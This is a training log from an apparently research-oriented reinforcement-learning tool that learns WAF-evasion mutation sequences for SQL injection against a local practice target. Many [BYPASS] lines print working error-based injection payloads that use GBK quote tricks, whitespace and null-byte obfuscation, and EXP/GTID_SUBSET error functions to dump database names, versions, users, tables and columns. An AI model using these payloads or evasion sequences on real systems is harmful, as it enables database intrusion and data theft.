/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run A2C on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — A2C Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Rollout     : n_steps=5 (synchronous A3C variant)
 Seed        : 1
============================================================
  Ep   10 | SR=0% | Steps=15.0 | R=-45.01
           payload: 1'%0bAND%0bGTID_SUBSET((database%a0()),1);%00  *** NEW SHORTEST ***
  Ep  370 | SR=10% | Steps=14.0 | R=-39.29
  Ep  380 | SR=0% | Steps=15.0 | R=-45.04
  Ep  390 | SR=0% | Steps=15.0 | R=-45.94
  Ep  400 | SR=0% | Steps=15.0 | R=-46.15
  Ep  410 | SR=0% | Steps=15.0 | R=-45.63
  Ep  420 | SR=0% | Steps=15.0 | R=-46.32
  Ep  430 | SR=0% | Steps=15.0 | R=-44.85
  Ep  440 | SR=0% | Steps=15.0 | R=-45.61
  Ep  450 | SR=0% | Steps=15.0 | R=-45.47
  Ep  460 | SR=0% | Steps=15.0 | R=-45.70
  Ep  470 | SR=0% | Steps=15.0 | R=-46.02
  Ep  480 | SR=0% | Steps=15.0 | R=-45.33
  Ep  490 | SR=0% | Steps=15.0 | R=-44.58
  Ep  500 | SR=0% | Steps=15.0 | R=-46.70
  Ep  510 | SR=0% | Steps=15.0 | R=-44.92
  Ep  520 | SR=0% | Steps=15.0 | R=-44.06
  Ep  530 | SR=0% | Steps=15.0 | R=-44.73
  Ep  540 | SR=0% | Steps=15.0 | R=-45.21
  Ep  550 | SR=0% | Steps=15.0 | R=-45.74
  Ep  560 | SR=0% | Steps=15.0 | R=-45.14
  Ep  570 | SR=0% | Steps=15.0 | R=-45.71
  Ep  580 | SR=0% | Steps=15.0 | R=-43.95
  Ep  590 | SR=0% | Steps=15.0 | R=-45.67
  Ep  600 | SR=0% | Steps=15.0 | R=-43.79
  Ep  610 | SR=0% | Steps=15.0 | R=-44.15
  Ep  620 | SR=0% | Steps=15.0 | R=-44.05
  Ep  630 | SR=0% | Steps=15.0 | R=-44.92
  Ep  640 | SR=0% | Steps=15.0 | R=-45.02
  Ep  650 | SR=0% | Steps=15.0 | R=-45.81
  Ep  660 | SR=0% | Steps=15.0 | R=-44.06
  Ep  670 | SR=0% | Steps=15.0 | R=-45.06
  Ep  680 | SR=0% | Steps=15.0 | R=-44.14
  Ep  690 | SR=0% | Steps=15.0 | R=-45.56
  Ep  700 | SR=0% | Steps=15.0 | R=-44.94
  Ep  710 | SR=0% | Steps=15.0 | R=-45.23
  Ep  720 | SR=0% | Steps=15.0 | R=-44.30
  Ep  730 | SR=0% | Steps=15.0 | R=-44.25
  Ep  740 | SR=0% | Steps=15.0 | R=-45.66
  Ep  750 | SR=0% | Steps=15.0 | R=-45.35
  Ep  760 | SR=0% | Steps=15.0 | R=-45.46
  Ep  770 | SR=0% | Steps=15.0 | R=-43.97
  Ep  780 | SR=0% | Steps=15.0 | R=-43.78
  Ep  790 | SR=0% | Steps=15.0 | R=-43.99
  Ep  800 | SR=0% | Steps=15.0 | R=-44.28
  Ep  810 | SR=0% | Steps=15.0 | R=-44.65
  Ep  820 | SR=0% | Steps=15.0 | R=-43.24
  Ep  830 | SR=0% | Steps=15.0 | R=-44.17
  Ep  840 | SR=0% | Steps=15.0 | R=-43.80
  Ep  850 | SR=0% | Steps=15.0 | R=-44.14
  Ep  860 | SR=0% | Steps=15.0 | R=-44.48
  Ep  870 | SR=0% | Steps=15.0 | R=-44.58
  Ep  880 | SR=0% | Steps=15.0 | R=-44.56
  Ep  890 | SR=0% | Steps=15.0 | R=-45.27
  Ep  900 | SR=0% | Steps=15.0 | R=-43.97
  Ep  910 | SR=0% | Steps=15.0 | R=-43.12
  Ep  920 | SR=0% | Steps=15.0 | R=-44.68
  Ep  930 | SR=0% | Steps=15.0 | R=-43.48
  Ep  940 | SR=0% | Steps=15.0 | R=-43.68
  Ep  950 | SR=0% | Steps=15.0 | R=-44.27
  Ep  960 | SR=0% | Steps=15.0 | R=-46.10
  Ep  970 | SR=0% | Steps=15.0 | R=-44.29
  Ep  980 | SR=0% | Steps=15.0 | R=-45.64
  Ep  990 | SR=0% | Steps=15.0 | R=-44.47
  Ep 1000 | SR=0% | Steps=15.0 | R=-44.11
  Ep 1010 | SR=0% | Steps=15.0 | R=-42.61
  Ep 1020 | SR=0% | Steps=15.0 | R=-44.89
  Ep 1030 | SR=0% | Steps=15.0 | R=-44.07
  Ep 1040 | SR=0% | Steps=15.0 | R=-45.35
  Ep 1050 | SR=0% | Steps=15.0 | R=-44.80
  Ep 1060 | SR=0% | Steps=15.0 | R=-45.05
  Ep 1070 | SR=0% | Steps=15.0 | R=-45.72
  Ep 1080 | SR=0% | Steps=15.0 | R=-44.95
  Ep 1090 | SR=0% | Steps=15.0 | R=-43.82
  Ep 1100 | SR=0% | Steps=15.0 | R=-43.87
  Ep 1110 | SR=0% | Steps=15.0 | R=-44.65
  Ep 1120 | SR=0% | Steps=15.0 | R=-44.19
  Ep 1130 | SR=0% | Steps=15.0 | R=-42.93
  Ep 1140 | SR=0% | Steps=15.0 | R=-43.69
  Ep 1150 | SR=0% | Steps=15.0 | R=-42.16
  Ep 1160 | SR=0% | Steps=15.0 | R=-43.81
  Ep 1170 | SR=0% | Steps=15.0 | R=-43.66
  Ep 1180 | SR=0% | Steps=15.0 | R=-44.41
  Ep 1190 | SR=0% | Steps=15.0 | R=-43.23
  Ep 1200 | SR=0% | Steps=15.0 | R=-43.23
  Ep 1210 | SR=0% | Steps=15.0 | R=-44.32
  Ep 1220 | SR=0% | Steps=15.0 | R=-43.61
  Ep 1230 | SR=0% | Steps=15.0 | R=-43.41
  [BYPASS] Ep 1236 | steps=14 | seq=crlf -> gbk_bypass -> plus_sep -> case -> unhex_wrap -> vtab -> null_byte -> case -> url_mid_char -> case -> comment -> distinct -> url_mid_char -> agg_swap
           payload: 1%bf%27%0d%0aAnd%0d%0aEXP(~(selecT%0d%0a*%0d%0afROm%0d%0a(selECT%0d%0a((seLect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrom%0d%0aInFormaTIon_scHEMa.schem
  Ep 1240 | SR=10% | Steps=14.9 | R=-42.20
  Ep 1250 | SR=0% | Steps=15.0 | R=-43.79
  [BYPASS] Ep 1257 | steps=6 | seq=ver_12345 -> agg_swap -> null_byte -> agg_swap -> vtab -> case
           payload: 1'%0band%0bEXP(~(SelEcT%0b*%0bFrom%0b(sElEct%0b((sEleCT%0bJSON_ARRAYAGG(schema_name)%0bFrOM%0bINFORMAtion_SChEma.schemata)))a));%00
  Ep 1260 | SR=10% | Steps=14.1 | R=-38.10
  Ep 1270 | SR=0% | Steps=15.0 | R=-43.71
  Ep 1280 | SR=0% | Steps=15.0 | R=-42.98
  [BYPASS] Ep 1284 | steps=11 | seq=gbk_bypass -> vtab -> case -> vtab -> vtab -> agg_swap -> case -> hex_to_char -> func_sp_nbsp -> func_sp_cmt -> null_byte
           payload: 1%bf%27%0band%0bEXP(~(SeLect%0b*%0bFRom%0b(SeLeCt%0b(version%a0()))a));%00
  Ep 1290 | SR=10% | Steps=14.6 | R=-41.34
  Ep 1300 | SR=0% | Steps=15.0 | R=-42.16
  Ep 1310 | SR=0% | Steps=15.0 | R=-41.87
  Ep 1320 | SR=0% | Steps=15.0 | R=-42.64
  Ep 1330 | SR=0% | Steps=15.0 | R=-42.76
  Ep 1340 | SR=0% | Steps=15.0 | R=-42.26
  Ep 1350 | SR=0% | Steps=15.0 | R=-42.53
  Ep 1360 | SR=0% | Steps=15.0 | R=-42.07
  Ep 1370 | SR=0% | Steps=15.0 | R=-41.76
  Ep 1380 | SR=0% | Steps=15.0 | R=-41.20
  Ep 1390 | SR=0% | Steps=15.0 | R=-42.23
  Ep 1400 | SR=0% | Steps=15.0 | R=-40.64
  Ep 1410 | SR=0% | Steps=15.0 | R=-42.38
  Ep 1420 | SR=0% | Steps=15.0 | R=-42.95
  Ep 1430 | SR=0% | Steps=15.0 | R=-42.55
  Ep 1440 | SR=0% | Steps=15.0 | R=-42.13
  [BYPASS] Ep 1446 | steps=11 | seq=agg_swap -> agg_swap -> case -> case -> dot_prefix -> agg_swap -> crlf -> nested_union -> hex_to_char -> ver_12345 -> null_byte
           payload: .11'%0d%0aaNd%0d%0aEXP(~(sELeCt%0d%0a*%0d%0aFrOm%0d%0a(selEcT%0d%0a((sELEcT%0d%0aJSON_ARRAYAGG(CONcaT(tABLE_schema,CHAR(46),table_name))%0d%0afRom%0d%
  Ep 1450 | SR=10% | Steps=14.6 | R=-37.55
  Ep 1460 | SR=0% | Steps=15.0 | R=-43.50
  [BYPASS] Ep 1462 | steps=12 | seq=dot_prefix -> null_byte -> case -> hex_to_char -> null_byte -> double_and -> nested_union -> null_byte -> agg_swap -> char_split -> vtab -> func_sp_nbsp
           payload: .11'%0banD%0bGTID_SUBSET((version%a0()),1);%00
  Ep 1470 | SR=10% | Steps=14.7 | R=-40.67
  Ep 1480 | SR=0% | Steps=15.0 | R=-42.99
  Ep 1490 | SR=0% | Steps=15.0 | R=-41.60
  Ep 1500 | SR=0% | Steps=15.0 | R=-41.77
  Ep 1510 | SR=0% | Steps=15.0 | R=-40.56
  Ep 1520 | SR=0% | Steps=15.0 | R=-40.82
  Ep 1530 | SR=0% | Steps=15.0 | R=-41.73
  Ep 1540 | SR=0% | Steps=15.0 | R=-42.01
  [BYPASS] Ep 1546 | steps=9 | seq=vtab -> agg_swap -> case -> hex_to_char -> case_split -> case -> case -> case -> null_byte
           payload: 1'%0banD%0bEXP(~(seLEct%0b*%0bfRoM%0b(sELeCT%0b((sEleCt%0bJSON_ARRAYAGG(schema_name)%0bFrOM%0bInfORmATIon_SCheMa.schemata)))a));%00
  Ep 1550 | SR=10% | Steps=14.4 | R=-37.37
  Ep 1560 | SR=0% | Steps=15.0 | R=-41.73
  Ep 1570 | SR=0% | Steps=15.0 | R=-43.09
  Ep 1580 | SR=0% | Steps=15.0 | R=-42.14
  Ep 1590 | SR=0% | Steps=15.0 | R=-42.36
  Ep 1600 | SR=0% | Steps=15.0 | R=-42.30
  Ep 1610 | SR=0% | Steps=15.0 | R=-42.68
  [BYPASS] Ep 1613 | steps=6 | seq=null_byte -> null_byte -> newline -> case -> case_split -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(selECT%0a*%0aFRom%0a(SEleCt%0a(daTaBase%a0()))a));%00
  Ep 1620 | SR=10% | Steps=14.1 | R=-38.28
  Ep 1630 | SR=0% | Steps=15.0 | R=-42.26
  Ep 1640 | SR=0% | Steps=15.0 | R=-39.12
  Ep 1650 | SR=0% | Steps=15.0 | R=-42.52
  Ep 1660 | SR=0% | Steps=15.0 | R=-41.80
  Ep 1670 | SR=0% | Steps=15.0 | R=-42.24
  Ep 1680 | SR=0% | Steps=15.0 | R=-42.18
  Ep 1690 | SR=0% | Steps=15.0 | R=-42.29
  Ep 1700 | SR=0% | Steps=15.0 | R=-41.93
  Ep 1710 | SR=0% | Steps=15.0 | R=-42.86
  Ep 1720 | SR=0% | Steps=15.0 | R=-40.73
  Ep 1730 | SR=0% | Steps=15.0 | R=-40.50
  Ep 1740 | SR=0% | Steps=15.0 | R=-40.38
  Ep 1750 | SR=0% | Steps=15.0 | R=-40.72
  [BYPASS] Ep 1760 | steps=13 | seq=func_sp_nbsp -> hex_to_char -> case -> null_byte -> case -> agg_swap -> null_byte -> case -> hex_to_char -> func_sp_lit -> hash_nl -> null_byte -> crlf
           payload: 1'%0d%0aANd%0d%0aEXP(~(sELEcT%0d%0a*%0d%0afroM%0d%0a(SEleCt%0d%0a((SELEct%0d%0aJSON_ARRAYAGG(CONcAT(TAbLE_schema,CHAR(46),TablE_name))%0d%0afrOm%0d%0a
  Ep 1760 | SR=10% | Steps=14.8 | R=-38.03
  Ep 1770 | SR=0% | Steps=15.0 | R=-39.86
  Ep 1780 | SR=0% | Steps=15.0 | R=-39.11
  Ep 1790 | SR=0% | Steps=15.0 | R=-38.52
  Ep 1800 | SR=0% | Steps=15.0 | R=-39.75
  Ep 1810 | SR=0% | Steps=15.0 | R=-38.53
  Ep 1820 | SR=0% | Steps=15.0 | R=-39.54
  Ep 1830 | SR=0% | Steps=15.0 | R=-39.54
  [BYPASS] Ep 1836 | steps=10 | seq=gbk_bypass -> case -> func_sp_nbsp -> case -> case -> null_byte -> case -> case -> case -> newline
           payload: 1%bf%27%0aANd%0aEXP(~(SeLECt%0a*%0afrOM%0a(SElect%0a(user%a0()))a));%00
  Ep 1840 | SR=10% | Steps=14.5 | R=-36.05
  Ep 1850 | SR=0% | Steps=15.0 | R=-39.17
  Ep 1860 | SR=0% | Steps=15.0 | R=-40.64
  Ep 1870 | SR=0% | Steps=15.0 | R=-39.62
  Ep 1880 | SR=0% | Steps=15.0 | R=-38.95
  Ep 1890 | SR=0% | Steps=15.0 | R=-40.83
  Ep 1900 | SR=0% | Steps=15.0 | R=-38.58
  Ep 1910 | SR=0% | Steps=15.0 | R=-39.55
  [BYPASS] Ep 1918 | steps=7 | seq=case -> null_byte -> case -> case -> crlf -> crlf -> agg_swap
           payload: 1'%0d%0aAnD%0d%0aEXP(~(sElECt%0d%0a*%0d%0afRom%0d%0a(selECt%0d%0a((seleCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRom%0d%0aiNFOrMaTIOn_ScHEMa.schemata))
  Ep 1920 | SR=10% | Steps=14.2 | R=-34.19
  Ep 1930 | SR=0% | Steps=15.0 | R=-40.04
  Ep 1940 | SR=0% | Steps=15.0 | R=-39.71
  [BYPASS] Ep 1947 | steps=14 | seq=gbk_bypass -> case -> func_sp_tab -> case_split -> case -> case -> crlf -> case -> case -> func_sp_cmt -> null_byte -> func_sp_tab -> case -> agg_swap
           payload: 1%bf%27%0d%0aaND%0d%0aEXP(~(SelecT%0d%0a*%0d%0afRom%0d%0a(sEleCT%0d%0a((sELect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFroM%0d%0aINForMATiON_SCheMA.schem
  Ep 1950 | SR=10% | Steps=14.9 | R=-37.01
  Ep 1960 | SR=0% | Steps=15.0 | R=-38.53
  Ep 1970 | SR=0% | Steps=15.0 | R=-38.44
  Ep 1980 | SR=0% | Steps=15.0 | R=-37.32
  Ep 1990 | SR=0% | Steps=15.0 | R=-38.53
  Ep 2000 | SR=0% | Steps=15.0 | R=-38.09
  [BYPASS] Ep 2009 | steps=10 | seq=case -> case -> null_byte -> func_sp_tab -> case -> agg_swap -> case -> null_byte -> case -> crlf
           payload: 1'%0d%0aand%0d%0aEXP(~(SElECt%0d%0a*%0d%0aFROm%0d%0a(selECT%0d%0a((sELeCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRom%0d%0aINFORmATION_schema.schemata))
  Ep 2010 | SR=10% | Steps=14.5 | R=-35.10
  Ep 2020 | SR=0% | Steps=15.0 | R=-39.38
  [BYPASS] Ep 2030 | steps=14 | seq=case -> hex_to_char -> case -> hex_to_char -> case -> crlf -> case -> case -> case -> case -> case -> func_sp_tab -> agg_swap -> null_byte
           payload: 1'%0d%0aAND%0d%0aEXP(~(SELeCT%0d%0a*%0d%0aFrom%0d%0a(sElecT%0d%0a((SeLect%0d%0aJSON_ARRAYAGG(CONCAT(TABLE_schema,CHAR(46),table_name))%0d%0afROm%0d%0a
  Ep 2030 | SR=10% | Steps=14.9 | R=-36.64
  [BYPASS] Ep 2039 | steps=5 | seq=case -> crlf -> case -> null_byte -> agg_swap
           payload: 1'%0d%0aanD%0d%0aEXP(~(sElEct%0d%0a*%0d%0aFRoM%0d%0a(sElecT%0d%0a((sELeCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOM%0d%0aInfOrMAtiON_ScHEma.schemata))
  Ep 2040 | SR=10% | Steps=14.0 | R=-34.16
  Ep 2050 | SR=0% | Steps=15.0 | R=-39.05
  Ep 2060 | SR=0% | Steps=15.0 | R=-39.05
  [BYPASS] Ep 2065 | steps=9 | seq=case_split -> null_byte -> case -> dot_prefix -> crlf -> case -> crlf -> case -> func_sp_nbsp
           payload: .11'%0d%0aAnD%0d%0aGTID_SUBSET((DATAbase%a0()),1);%00
  Ep 2070 | SR=10% | Steps=14.4 | R=-35.43
  Ep 2080 | SR=0% | Steps=15.0 | R=-38.20
  Ep 2090 | SR=0% | Steps=15.0 | R=-37.18
  Ep 2100 | SR=0% | Steps=15.0 | R=-38.25
  Ep 2110 | SR=0% | Steps=15.0 | R=-38.08
  Ep 2120 | SR=0% | Steps=15.0 | R=-39.05
  Ep 2130 | SR=0% | Steps=15.0 | R=-38.88
  Ep 2140 | SR=0% | Steps=15.0 | R=-37.64
  Ep 2150 | SR=0% | Steps=15.0 | R=-38.82
  Ep 2160 | SR=0% | Steps=15.0 | R=-38.51
  [BYPASS] Ep 2167 | steps=10 | seq=case -> null_byte -> case -> case -> case -> case -> agg_swap -> case -> case -> crlf
           payload: 1'%0d%0aANd%0d%0aEXP(~(SElECT%0d%0a*%0d%0afRom%0d%0a(SeleCt%0d%0a((sELeCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOM%0d%0aINformaTIOn_SchEmA.schemata))
  Ep 2170 | SR=10% | Steps=14.5 | R=-34.58
  [BYPASS] Ep 2174 | steps=4 | seq=case -> func_sp_nbsp -> crlf -> null_byte
           payload: 1'%0d%0aaNd%0d%0aGTID_SUBSET((version%a0()),1);%00  *** NEW SHORTEST ***
  [BYPASS] Ep 2180 | steps=12 | seq=null_byte -> case -> case -> hex_to_char -> case -> case -> null_byte -> case -> case -> agg_swap -> null_byte -> newline
           payload: 1'%0aAnD%0aEXP(~(SeleCT%0a*%0aFRoM%0a(selECt%0a((SElECt%0aJSON_ARRAYAGG(CONCAT(tabLE_schema,CHAR(46),tablE_name))%0afrom%0aInforMaTIoN_ScheMa.taBlEs%0
  Ep 2180 | SR=20% | Steps=13.6 | R=-31.27
  [BYPASS] Ep 2186 | steps=4 | seq=crlf -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0d%0aANd%0d%0aEXP(~(seLECT%0d%0a*%0d%0aFRoM%0d%0a(sEleCT%0d%0a(dATaBase%a0()))a));%00
  Ep 2190 | SR=10% | Steps=13.9 | R=-34.74
  Ep 2200 | SR=0% | Steps=15.0 | R=-40.85
  Ep 2210 | SR=0% | Steps=15.0 | R=-38.18
  Ep 2220 | SR=0% | Steps=15.0 | R=-38.16
  Ep 2230 | SR=0% | Steps=15.0 | R=-38.05
  Ep 2240 | SR=0% | Steps=15.0 | R=-39.96
  Ep 2250 | SR=0% | Steps=15.0 | R=-40.34
  Ep 2260 | SR=0% | Steps=15.0 | R=-38.97
  Ep 2270 | SR=0% | Steps=15.0 | R=-39.55
  Ep 2280 | SR=0% | Steps=15.0 | R=-38.80
  Ep 2290 | SR=0% | Steps=15.0 | R=-39.07
  Ep 2300 | SR=0% | Steps=15.0 | R=-38.30
  Ep 2310 | SR=0% | Steps=15.0 | R=-37.77
  Ep 2320 | SR=0% | Steps=15.0 | R=-39.58
  Ep 2330 | SR=0% | Steps=15.0 | R=-40.45
  Ep 2340 | SR=0% | Steps=15.0 | R=-39.36
  [BYPASS] Ep 2349 | steps=11 | seq=case -> case -> case -> case -> case -> func_sp_tab -> agg_swap -> case -> agg_swap -> crlf -> null_byte
           payload: 1'%0d%0aANd%0d%0aEXP(~(SeLEct%0d%0a*%0d%0afROm%0d%0a(SeleCt%0d%0a((SELeCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOm%0d%0aiNfORmaTIon_sCHEmA.schemata))
  Ep 2350 | SR=10% | Steps=14.6 | R=-35.44
  Ep 2360 | SR=0% | Steps=15.0 | R=-40.21
  Ep 2370 | SR=0% | Steps=15.0 | R=-40.11
  [BYPASS] Ep 2371 | steps=10 | seq=null_byte -> crlf -> func_sp_tab -> case -> case -> formfeed -> hex_to_char -> case -> crlf -> agg_swap
           payload: 1'%0d%0aaND%0d%0aEXP(~(seLeCt%0d%0a*%0d%0aFROm%0d%0a(SeLeCt%0d%0a((SeLECT%0d%0aJSON_ARRAYAGG(CONCAT(taBLE_schema,CHAR(46),tAbLE_name))%0d%0afrom%0d%0a
  Ep 2380 | SR=10% | Steps=14.5 | R=-37.60
  [BYPASS] Ep 2389 | steps=14 | seq=case -> null_byte -> case -> hex_to_char -> crlf -> hex_to_char -> case -> null_byte -> case -> func_sp_tab -> null_byte -> hash_nl -> formfeed -> agg_swap
           payload: 1'%0d%0aAnD%0d%0aEXP(~(SelEcT%0d%0a*%0d%0afroM%0d%0a(SelECt%0d%0a((SElECt%0d%0aJSON_ARRAYAGG(CONCAT(tABLE_schema,CHAR(46),tABLE_name))%0d%0afrom%0d%0a
  Ep 2390 | SR=10% | Steps=14.9 | R=-39.21
  Ep 2400 | SR=0% | Steps=15.0 | R=-39.00
  [BYPASS] Ep 2408 | steps=10 | seq=case -> case -> case -> formfeed -> case -> agg_swap -> hex_to_char -> hex_to_char -> null_byte -> func_sp_nbsp
           payload: 1'%0cAnD%0cGTID_SUBSET((user%a0()),1);%00
  Ep 2410 | SR=10% | Steps=14.5 | R=-37.95
  Ep 2420 | SR=0% | Steps=15.0 | R=-39.94
  Ep 2430 | SR=0% | Steps=15.0 | R=-38.38
  Ep 2440 | SR=0% | Steps=15.0 | R=-38.74
  Ep 2450 | SR=0% | Steps=15.0 | R=-39.37
  Ep 2460 | SR=0% | Steps=15.0 | R=-37.93
  Ep 2470 | SR=0% | Steps=15.0 | R=-38.26
  [BYPASS] Ep 2474 | steps=9 | seq=formfeed -> case -> case -> hex_to_char -> case -> null_byte -> case -> case -> agg_swap
           payload: 1'%0canD%0cEXP(~(seleCT%0c*%0cFrOM%0c(seLECt%0c((SELEct%0cJSON_ARRAYAGG(CONCAT(TAblE_schema,CHAR(46),TAbLe_name))%0cfroM%0cInFOrmATION_sCHEMa.tAblEs%0
  Ep 2480 | SR=10% | Steps=14.4 | R=-34.90
  Ep 2490 | SR=0% | Steps=15.0 | R=-38.78
  [BYPASS] Ep 2493 | steps=13 | seq=case -> convert_charset -> case -> null_byte -> case -> hex_to_char -> case -> null_byte -> agg_swap -> formfeed -> case -> case -> func_sp_nbsp
           payload: 1'%0cAND%0cEXP(~(seLEct%0c*%0cfRoM%0c(SEleCt%0c(version%a0()))a));%00
  Ep 2500 | SR=10% | Steps=14.8 | R=-36.84
  Ep 2510 | SR=0% | Steps=15.0 | R=-38.08
  [BYPASS] Ep 2515 | steps=13 | seq=null_byte -> agg_swap -> case -> null_byte -> crlf -> case -> case -> case -> case -> agg_swap -> case -> case -> func_sp_nbsp
           payload: 1'%0d%0aaND%0d%0aEXP(~(SELEct%0d%0a*%0d%0afroM%0d%0a(sElEct%0d%0a((SEleCt%0d%0aJSON_ARRAYAGG(column_name)%0d%0aFrOM%0d%0aInfoRMaTiOn_SCheMA.columns%0d
  [BYPASS] Ep 2517 | steps=13 | seq=case -> hex_to_char -> double_or -> case -> agg_swap -> case -> null_byte -> case -> case -> case -> ver_urlenc -> agg_swap -> crlf
           payload: 1'%0d%0aaNd%0d%0aEXP(~(SEleCT%0d%0a*%0d%0aFRom%0d%0a(SeleCT%0d%0a((seleCt%0d%0aJSON_ARRAYAGG(coNCAt(TablE_schema,CHAR(46),taBlE_name))%0d%0aFROm%0d%0a
  Ep 2520 | SR=20% | Steps=14.6 | R=-34.31
  Ep 2530 | SR=0% | Steps=15.0 | R=-38.57
  [BYPASS] Ep 2531 | steps=13 | seq=case -> case -> crlf -> case -> case -> null_byte -> case -> case -> agg_swap -> between_space -> case -> case -> hex_to_char
           payload: 1'%0d%0aAnD%0d%0aEXP(~(SeLEcT%0d%0a*%0d%0afROM%0d%0a(selEcT%0d%0a((selECT%0d%0aJSON_ARRAYAGG(COncAt(TAbLE_schema,CHAR(46),TaBle_name))%0d%0aFROM%0d%0a
  Ep 2540 | SR=10% | Steps=14.8 | R=-36.72
